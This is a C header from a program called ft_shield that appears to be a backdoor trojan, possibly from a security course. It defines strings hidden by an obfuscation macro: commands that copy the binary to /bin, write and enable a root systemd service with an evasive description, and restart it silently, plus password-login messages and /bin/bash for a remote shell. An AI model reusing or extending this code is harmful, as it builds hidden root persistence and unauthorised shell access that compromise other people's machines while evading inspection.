#ifndef CONSTANTS_H
#define CONSTANTS_H

#include "shield.h"
#include <stdint.h>

typedef enum ObfuscatedStringTableIndex {
    PROC_SELF_EXE,
    BIN_FT_SHIELD,
    SYSTEMCTL_DAEMON_RELOAD,
    SYSTEMCTL_START_FT_SHIELD,
    SYSTEMCTL_STOP_FT_SHIELD,
    SYSTEMCTL_ENABLE_FT_SHIELD,
    SYSTEMD_CONFIG,
    SYSTEMD_CONFIG_PATH,
    INVALID_PASSWORD_TRY_AGAIN,
    LOGIN_SUCCESSFUL,
    BIN_BASH,
    TOO_MANY_CONNECTIONS,
} ObfuscatedStringTableIndex;

// Will be preprocessed for codegen by scripts/encode.py
#define OBFUSCATE(x) x

static uint8_t proc_self_exe[] = OBFUSCATE("/proc/self/exe");
static uint8_t bin_ft_shield[] = OBFUSCATE("/bin/ft_shield");
static uint8_t systemctl_daemon_reload[] = OBFUSCATE("systemctl daemon-reload > /dev/null 2>&1");
static uint8_t systemctl_start_ft_shield[] = OBFUSCATE("systemctl start ft_shield > /dev/null 2>&1");
static uint8_t systemctl_stop_ft_shield[] = OBFUSCATE("systemctl stop ft_shield > /dev/null 2>&1");
static uint8_t systemctl_enable_ft_shield[] = OBFUSCATE("systemctl enable ft_shield > /dev/null 2>&1");
static uint8_t systemd_config[] = OBFUSCATE("[Unit]\nDescription=None of your business G\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/bin/ft_shield %s\n\n[Install]\nWantedBy=multi-user.target\n");
static uint8_t systemd_config_path[] = OBFUSCATE("/etc/systemd/system/ft_shield.service");
static uint8_t invalid_password_try_again[] = OBFUSCATE("Invalid password, try again\n");
static uint8_t login_successful[] = OBFUSCATE("Login successful\n");
static uint8_t bin_bash[] = OBFUSCATE("/bin/bash");
static uint8_t too_many_connections[] = OBFUSCATE("Too many connections already in use\n");

static ObfuscatedStringTableEntry strings[] = {
    {.data = (uint8_t *)proc_self_exe,              .len = sizeof(proc_self_exe),              .decoded = false},
    {.data = (uint8_t *)bin_ft_shield,              .len = sizeof(bin_ft_shield),              .decoded = false},
    {.data = (uint8_t *)systemctl_daemon_reload,    .len = sizeof(systemctl_daemon_reload),    .decoded = false},
    {.data = (uint8_t *)systemctl_start_ft_shield,  .len = sizeof(systemctl_start_ft_shield),  .decoded = false},
    {.data = (uint8_t *)systemctl_stop_ft_shield,   .len = sizeof(systemctl_stop_ft_shield),   .decoded = false},
    {.data = (uint8_t *)systemctl_enable_ft_shield, .len = sizeof(systemctl_enable_ft_shield), .decoded = false},
    {.data = (uint8_t *)systemd_config,             .len = sizeof(systemd_config),             .decoded = false},
    {.data = (uint8_t *)systemd_config_path,        .len = sizeof(systemd_config_path),        .decoded = false},
    {.data = (uint8_t *)invalid_password_try_again, .len = sizeof(invalid_password_try_again), .decoded = false},
    {.data = (uint8_t *)login_successful,           .len = sizeof(login_successful),           .decoded = false},
    {.data = (uint8_t *)bin_bash,                   .len = sizeof(bin_bash),                   .decoded = false},
    {.data = (uint8_t *)too_many_connections,       .len = sizeof(too_many_connections),       .decoded = false},
};

#endif
